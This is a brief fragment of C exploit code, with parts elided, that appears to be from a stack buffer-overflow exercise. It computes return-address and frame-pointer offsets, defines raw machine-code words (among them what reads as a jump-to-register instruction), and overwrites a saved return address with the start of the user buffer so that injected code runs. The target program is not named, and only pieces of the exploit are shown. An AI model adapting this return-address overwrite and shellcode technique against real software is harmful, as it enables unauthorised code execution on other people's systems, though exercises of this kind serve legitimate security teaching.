...
int main(int argc, char* argv[]) {
   ...
   //void* user_buff = (cur_mainloop_ra - mainloop_auth_ra_diff - auth_ra_user_diff) + 8;


   unsigned code0 = 0x2d04458b;
   unsigned code1 = 0x000002d0;
   unsigned code2 = 0xe0ff;
   ...
   expl[auth_ra_user_diff/sizeof(void*)] = 
      (void*)(cur_mainloop_bp - mainloop_auth_bp_diff - auth_bp_user_diff - 48); // This should be the start of the user buffer
      //user_buff;
